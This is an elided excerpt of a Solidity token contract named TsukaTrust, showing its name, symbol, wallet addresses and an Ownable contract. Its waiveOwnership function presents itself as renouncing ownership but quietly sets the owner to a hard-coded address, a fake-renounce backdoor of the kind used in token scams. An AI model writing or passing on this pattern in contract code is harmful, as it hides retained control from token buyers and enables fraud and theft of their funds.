...
// Telegram : https://t.me/TsukaTrustInfo
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x7C39C555f0B62FEFEBB54C2AdB102b42F3573084);
...
contract TsukaTrust is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "TsukaTrust";
    string private _symbol = "TT";
    uint8 private _decimals = 9;

    address payable public fundWalletAddress = payable(0xA3409a41696B0685B070f796570Fdbc68f5b2917);
    address payable public teamWalletAddress = payable(0xA3409a41696B0685B070f796570Fdbc68f5b2917);
